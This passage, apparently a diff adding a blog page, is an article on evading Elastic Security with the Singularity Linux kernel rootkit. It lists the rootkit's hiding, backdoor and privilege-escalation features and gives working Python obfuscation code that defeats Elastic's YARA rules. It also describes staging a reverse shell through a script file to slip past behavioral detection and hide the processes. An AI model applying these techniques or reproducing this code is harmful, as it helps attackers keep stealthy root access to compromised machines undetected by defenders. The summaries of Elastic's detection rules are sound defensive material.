using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic’s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit’s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security’s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: String fragmentation and symbol randomization Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nIf you’ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n",
+  "wordCount" : "3921",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "0xMatheuZ"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/bypassing-elastic/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "0xMatheuZ",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="MatheuZ (Alt + H)">
+                <img src="https://i.imgur.com/xeSd64L.png" alt="" aria-label="logo"
+                    height="25">MatheuZ</a>
+            <div class="logo-switches">
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="hacking">
+                    <span>hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Evading Elastic Security: Linux Rootkit Detection Bypass
+    </h1>
+    <div class="post-description">
+      Bypassing YARA rules and behavioral detection through string obfuscation, module fragmentation, XOR encoding, and ICMP reverse shell staging
+    </div>
+    <div class="post-meta">19 min&nbsp;·&nbsp;0xMatheuZ
+
+</div>
+  </header> 
+  <div class="post-content"><p><img loading="lazy" src="https://giffiles.alphacoders.com/223/223415.gif" alt="imgur"  />
+</p>
+<p>Stealthy Kernel Rootkit: <a href="https://github.com/MatheuZSecurity/Singularity">https://github.com/MatheuZSecurity/Singularity</a></p>
+<h1 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h1>
+<p>Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.</p>
+<p>This article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security&rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.</p>
+<h1 id="table-of-contents">Table of Contents<a hidden class="anchor" aria-hidden="true" href="#table-of-contents">#</a></h1>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#understanding-the-threat-landscape-elastic-yara-rules">Understanding the Threat Landscape: Elastic YARA Rules</a>
+<ul>
+<li><a href="#primary-detection-rules">Primary Detection Rules</a></li>
+<li><a href="#detection-signature-analysis">Detection Signature Analysis</a></li>
+</ul>
+</li>
+<li><a href="#the-singularity-rootkit-capabilities-overview">The Singularity Rootkit: Capabilities Overview</a>
+<ul>
+<li><a href="#core-features">Core Features</a></li>
+</ul>
+</li>
+<li><a href="#evasion-technique-1-string-obfuscation">Evasion Technique 1: String Obfuscation</a>
+<ul>
+<li><a href="#the-problem">The Problem</a></li>
+<li><a href="#the-solution-compile-time-string-fragmentation">The Solution: Compile-Time String Fragmentation</a></li>
+<li><a href="#implementation">Implementation</a></li>
+</ul>
+</li>
+<li><a href="#evasion-technique-2-symbol-name-randomization">Evasion Technique 2: Symbol Name Randomization</a>
+<ul>
+<li><a href="#the-problem-1">The Problem</a></li>
+<li><a href="#the-solution-intelligent-name-randomization">The Solution: Intelligent Name Randomization</a></li>
+</ul>
+</li>
+<li><a href="#evasion-technique-3-module-fragmentation">Evasion Technique 3: Module Fragmentation</a>
+<ul>
+<li><a href="#the-problem-2">The Problem</a></li>
+<li><a href="#the-solution-fragment--xor-encoding--in-memory-loading">The Solution: Fragment + XOR Encoding + In-Memory Loading</a></li>
+<li><a href="#custom-loader-via-memfd_create">Custom Loader via memfd_create</a></li>
+</ul>
+</li>
+<li><a href="#evasion-technique-4-ftrace-helper-obfuscation">Evasion Technique 4: Ftrace Helper Obfuscation</a>
+<ul>
+<li><a href="#the-problem-3">The Problem</a></li>
+<li><a href="#the-solution-rename-ftrace-framework-functions">The Solution: Rename Ftrace Framework Functions</a></li>
+</ul>
+</li>
+<li><a href="#build-pipeline-automated-obfuscation-workflow">Build Pipeline: Automated Obfuscation Workflow</a></li>
+<li><a href="#final-test-successful-evasion">Final Test: Successful Evasion</a></li>
+<li><a href="#bonus-compilation-path-detection-bypass">Bonus: Compilation Path Detection Bypass</a></li>
+<li><a href="#bonus-2-bypassing-elastic-behavioral-detection-for-reverse-shells">Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+<h1 id="understanding-the-threat-landscape-elastic-yara-rules">Understanding the Threat Landscape: Elastic YARA Rules<a hidden class="anchor" aria-hidden="true" href="#understanding-the-threat-landscape-elastic-yara-rules">#</a></h1>
+<p><img loading="lazy" src="https://i.imgur.com/6dUtAak.png" alt="imgur"  />
+</p>
+<p>In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.</p>
+<p><img loading="lazy" src="https://i.imgur.com/guHHiEj.png" alt="imgur"  />
+</p>
+<p>There were approximately 26 detections.</p>
+<p>Upon investigation, I identified the specific Elastic YARA rules detecting our rootkit:</p>
+<h4 id="primary-detection-rules">Primary Detection Rules<a hidden class="anchor" aria-hidden="true" href="#primary-detection-rules">#</a></h4>
+<p><a href="https://raw.githubusercontent.com/elastic/protections-artifacts/refs/heads/main/yara/rules/Linux_Rootkit_BrokePKG.yar">Linux_Rootkit_BrokePKG.yar</a></p>
+<p><a href="https://raw.githubusercontent.com/elastic/protections-artifacts/ff154ddf0762a4a030c8832eee7753cb19b950ff/yara/rules/Linux_Rootkit_Generic.yar">Linux_Rootkit_Generic.yar</a></p>
+<pre tabindex="0"><code>Linux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names
+Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns
+Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations
+Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions
+Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms
+Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits
+</code></pre><h4 id="detection-signature-analysis">Detection Signature Analysis<a hidden class="anchor" aria-hidden="true" href="#detection-signature-analysis">#</a></h4>
+<h4 id="generic-rootkit-detection-61229bdf">Generic Rootkit Detection (61229bdf)<a hidden class="anchor" aria-hidden="true" href="#generic-rootkit-detection-61229bdf">#</a></h4>
+<pre tabindex="0"><code>Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc.
+Condition: 4 or more matching strings
+Total patterns: 57 distinct function names
+</code></pre><h4 id="hook-pattern-detection-482bca48">Hook Pattern Detection (482bca48)<a hidden class="anchor" aria-hidden="true" href="#hook-pattern-detection-482bca48">#</a></h4>
+<pre tabindex="0"><code>System strings: sys_call_table, kallsyms_lookup_name, kprobe
+Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_
+Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show
+Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks)
+</code></pre><h4 id="license-string-detection-5d17781b">License String Detection (5d17781b)<a hidden class="anchor" aria-hidden="true" href="#license-string-detection-5d17781b">#</a></h4>
+<pre tabindex="0"><code>Targets: kallsyms_lookup_name_t + &#34;license=GPL&#34;
+Condition: Both strings must be present
+Purpose: Detects ftrace-based rootkits using kallsyms
+</code></pre><h4 id="ftrace-helper-detection-f07bcabe">Ftrace Helper Detection (f07bcabe)<a hidden class="anchor" aria-hidden="true" href="#ftrace-helper-detection-f07bcabe">#</a></h4>
+<pre tabindex="0"><code>Targets:
+  - fh_install_hook
+  - fh_remove_hook
+  - fh_resolve_hook_address
+Condition: 2 or more matching strings
+</code></pre><h4 id="brokepkg-specific-detection-7b7d4581">BrokePKG Specific Detection (7b7d4581)<a hidden class="anchor" aria-hidden="true" href="#brokepkg-specific-detection-7b7d4581">#</a></h4>
+<pre tabindex="0"><code>License strings:
+  - author=R3tr074
+  - name=brokepkg
+  - description=Rootkit
+  - license=GPL
+
+Specific strings:
+  - brokepkg
+  - brokepkg: module revealed
+  - br0k3_n0w_h1dd3n
+
+Hook patterns:
+  - nf_inet_hooks
+  - ftrace_hook
+  - hook_getdents
+  - hook_kill
+  - orig_tcp4_seq_show
+
+Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
+</code></pre><p>Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?</p>
+<h1 id="the-singularity-rootkit-capabilities-overview">The Singularity Rootkit: Capabilities Overview<a hidden class="anchor" aria-hidden="true" href="#the-singularity-rootkit-capabilities-overview">#</a></h1>
+<p>Source: <a href="https://github.com/MatheuZSecurity/Singularity">https://github.com/MatheuZSecurity/Singularity</a></p>
+<p>Before diving into evasion techniques, let&rsquo;s understand what the Singularity rootkit accomplishes:</p>
+<h3 id="core-features">Core Features<a hidden class="anchor" aria-hidden="true" href="#core-features">#</a></h3>
+<ul>
+<li>Process Hiding: Hides processes from /proc.</li>
+<li>File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.)</li>
+<li>Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools</li>
+<li>Privilege Escalation: Provides root access via signal 59 (kill -59 <!-- raw HTML omitted -->) or environment variable (MAGIC=mtz)</li>
+<li>ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337)</li>
+</ul>
+<p>Anti-Analysis Features:</p>
+<ul>
+<li>Blocks BPF programs and tracing</li>
+<li>Prevents ftrace manipulation by other users</li>
+<li>Disables module loading via init_module/finit_module hooks</li>
+<li>Filters /proc/kallsyms, /proc/modules, and tracefs</li>
+<li>Taint Clearing: Resets kernel taint flags to hide unsigned module loading</li>
+<li>Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit</li>
+<li>Module Stealth: Self-hiding from lsmod and /sys/module directory</li>
+</ul>
+<h1 id="evasion-technique-1-string-obfuscation">Evasion Technique 1: String Obfuscation<a hidden class="anchor" aria-hidden="true" href="#evasion-technique-1-string-obfuscation">#</a></h1>
+<h3 id="the-problem">The Problem<a hidden class="anchor" aria-hidden="true" href="#the-problem">#</a></h3>
+<p>Elastic&rsquo;s YARA rules scan for static strings like &ldquo;GPL&rdquo; and &ldquo;kallsyms_lookup_name&rdquo;. A simple strings command on our module would expose these signatures immediately.</p>
+<p>The specific rule (5d17781b) detects:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">$</span><span class="n">str</span> <span class="o">=</span> <span class="s">&#34;kallsyms_lookup_name_t&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">lic1</span> <span class="o">=</span> <span class="s">&#34;license=Dual BSD/GPL&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">lic2</span> <span class="o">=</span> <span class="s">&#34;license=GPL&#34;</span>
+</span></span></code></pre></div><h3 id="the-solution-compile-time-string-fragmentation">The Solution: Compile-Time String Fragmentation<a hidden class="anchor" aria-hidden="true" href="#the-solution-compile-time-string-fragmentation">#</a></h3>
+<p>Our obfuscator breaks strings into separate compile-time constants that the C compiler concatenates during compilation. This prevents contiguous strings from appearing in the binary.</p>
+<h3 id="implementation">Implementation<a hidden class="anchor" aria-hidden="true" href="#implementation">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_obfuscate_license_strings</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Obfuscates MODULE_LICENSE/AUTHOR/DESCRIPTION strings
+</span></span></span><span class="line"><span class="cl"><span class="s2">    To evade YARA rule: Linux.Rootkit.Generic (5d17781b)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    The rule detects: kallsyms_lookup_name_t AND license=GPL
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># 1. Obfuscate MODULE_LICENSE(&#34;GPL&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Transform: MODULE_LICENSE(&#34;GPL&#34;) </span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Into:      MODULE_LICENSE(&#34;G&#34; &#34;P&#34; &#34;L&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;MODULE_LICENSE\s*\(\s*&#34;GPL&#34;\s*\)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;MODULE_LICENSE(&#34;G&#34; &#34;P&#34; &#34;L&#34;)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># 2. Obfuscate MODULE_LICENSE(&#34;Dual BSD/GPL&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;MODULE_LICENSE\s*\(\s*&#34;Dual BSD/GPL&#34;\s*\)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;MODULE_LICENSE(&#34;Dual&#34; &#34; &#34; &#34;BSD&#34; &#34;/&#34; &#34;GPL&#34;)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># 3. Obfuscate MODULE_AUTHOR</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;MODULE_AUTHOR\s*\(\s*&#34;([^&#34;]+)&#34;\s*\)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="k">lambda</span> <span class="n">m</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;MODULE_AUTHOR(&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">_split_string</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="si">}</span><span class="s1">&#34;)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># 4. Obfuscate MODULE_DESCRIPTION</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;MODULE_DESCRIPTION\s*\(\s*&#34;([^&#34;]+)&#34;\s*\)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="k">lambda</span> <span class="n">m</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;MODULE_DESCRIPTION(&#34;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">_split_string</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="si">}</span><span class="s1">&#34;)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">content</span>
+</span></span></code></pre></div><h4 id="string-splitting-helper">String Splitting Helper<a hidden class="anchor" aria-hidden="true" href="#string-splitting-helper">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_split_string</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Divide string in parts for obfuscation&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#34; &#34;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Divide into chunks of 2-4 characters</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chunks</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk_size</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nb">min</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">chunk_size</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">+=</span> <span class="n">chunk_size</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#34; &#34;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>
+</span></span></code></pre></div><p>Before Obfuscation</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;MatheuZSecurity&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Rootkit Researchers: https://discord.gg/66N5ZQppU7&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>After Obfuscation</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;G&#34;</span> <span class="s">&#34;P&#34;</span> <span class="s">&#34;L&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;Mathe&#34;</span> <span class="s">&#34;uZ&#34;</span> <span class="s">&#34;Secur&#34;</span> <span class="s">&#34;ity&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Root&#34;</span> <span class="s">&#34;kit &#34;</span> <span class="s">&#34;Rese&#34;</span> <span class="s">&#34;arche&#34;</span> <span class="s">&#34;rs: &#34;</span> <span class="s">&#34;http&#34;</span> <span class="s">&#34;s://&#34;</span> <span class="s">&#34;disc&#34;</span> <span class="s">&#34;ord.&#34;</span> <span class="s">&#34;gg/6&#34;</span> <span class="s">&#34;6N5Z&#34;</span> <span class="s">&#34;QppU&#34;</span> <span class="s">&#34;7&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><h3 id="why-this-works">Why This Works<a hidden class="anchor" aria-hidden="true" href="#why-this-works">#</a></h3>
+<p>The C compiler concatenates adjacent string literals during compilation according to the C standard:</p>
+<ul>
+<li>Adjacent string literal tokens are concatenated</li>
+</ul>
+<p>This means:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="s">&#34;Hello&#34;</span> <span class="s">&#34; &#34;</span> <span class="s">&#34;World&#34;</span>  <span class="c1">// Becomes &#34;Hello World&#34; at compile time
+</span></span></span></code></pre></div><p>The binary&rsquo;s .rodata section stores this as a single contiguous string. However, the key insight: YARA rules scan the binary, not the source code. By fragmenting strings in source but allowing compiler concatenation, we break YARA pattern matching while maintaining functionality.</p>
+<p>Verification</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check for GPL string</span>
+</span></span><span class="line"><span class="cl">strings obfuscated/singularity.ko <span class="p">|</span> grep -i <span class="s2">&#34;GPL&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># No results</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># But the module still loads correctly</span>
+</span></span><span class="line"><span class="cl">modinfo obfuscated/singularity.ko <span class="p">|</span> grep license
+</span></span><span class="line"><span class="cl"><span class="c1"># license:        GPL</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The string exists in .modinfo section but fragmented</span>
+</span></span><span class="line"><span class="cl">objdump -s obfuscated/singularity.ko -j .modinfo <span class="p">|</span> grep -A2 license
+</span></span></code></pre></div><h4 id="kallsyms-obfuscation">Kallsyms Obfuscation<a hidden class="anchor" aria-hidden="true" href="#kallsyms-obfuscation">#</a></h4>
+<p>Similarly, we obfuscate kallsyms_lookup_name references:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_obfuscate_kallsyms_strings</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Obfuscates kallsyms_lookup_name references
+</span></span></span><span class="line"><span class="cl"><span class="s2">    that are detected by Elastic
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Obfuscate kallsyms_lookup_name_t</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;kallsyms_lookup_name_t&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;k&#39;</span> <span class="s1">&#39;a&#39;</span> <span class="s1">&#39;l&#39;</span> <span class="s1">&#39;l&#39;</span> <span class="s1">&#39;s&#39;</span> <span class="s1">&#39;y&#39;</span> <span class="s1">&#39;m&#39;</span> <span class="s1">&#39;s&#39;</span> <span class="s1">&#39;_&#39;</span> <span class="s1">&#39;l&#39;</span> <span class="s1">&#39;o&#39;</span> <span class="s1">&#39;o&#39;</span> <span class="s1">&#39;k&#39;</span> <span class="s1">&#39;u&#39;</span> <span class="s1">&#39;p&#39;</span> <span class="s1">&#39;_&#39;</span> <span class="s1">&#39;n&#39;</span> <span class="s1">&#39;a&#39;</span> <span class="s1">&#39;m&#39;</span> <span class="s1">&#39;e&#39;</span> <span class="s1">&#39;_&#39;</span> <span class="s1">&#39;t&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Obfuscate kallsyms references</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;kallsyms_lookup_name&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;k&#39;</span> <span class="s1">&#39;a&#39;</span> <span class="s1">&#39;l&#39;</span> <span class="s1">&#39;l&#39;</span> <span class="s1">&#39;s&#39;</span> <span class="s1">&#39;y&#39;</span> <span class="s1">&#39;m&#39;</span> <span class="s1">&#39;s&#39;</span> <span class="s1">&#39;_&#39;</span> <span class="s1">&#39;l&#39;</span> <span class="s1">&#39;o&#39;</span> <span class="s1">&#39;o&#39;</span> <span class="s1">&#39;k&#39;</span> <span class="s1">&#39;u&#39;</span> <span class="s1">&#39;p&#39;</span> <span class="s1">&#39;_&#39;</span> <span class="s1">&#39;n&#39;</span> <span class="s1">&#39;a&#39;</span> <span class="s1">&#39;m&#39;</span> <span class="s1">&#39;e&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">content</span>
+</span></span></code></pre></div><h1 id="evasion-technique-2-symbol-name-randomization">Evasion Technique 2: Symbol Name Randomization<a hidden class="anchor" aria-hidden="true" href="#evasion-technique-2-symbol-name-randomization">#</a></h1>
+<h3 id="the-problem-1">The Problem<a hidden class="anchor" aria-hidden="true" href="#the-problem-1">#</a></h3>
+<p>Rootkits typically use predictable naming patterns that become signatures:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hook_getdents64</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_tcp4_seq_show</span>
+</span></span><span class="line"><span class="cl"><span class="n">hide_module</span>
+</span></span><span class="line"><span class="cl"><span class="n">orig_kill</span>
+</span></span><span class="line"><span class="cl"><span class="n">hacked_open</span>
+</span></span><span class="line"><span class="cl"><span class="n">hooked_read</span>
+</span></span></code></pre></div><p>Elastic&rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:</p>
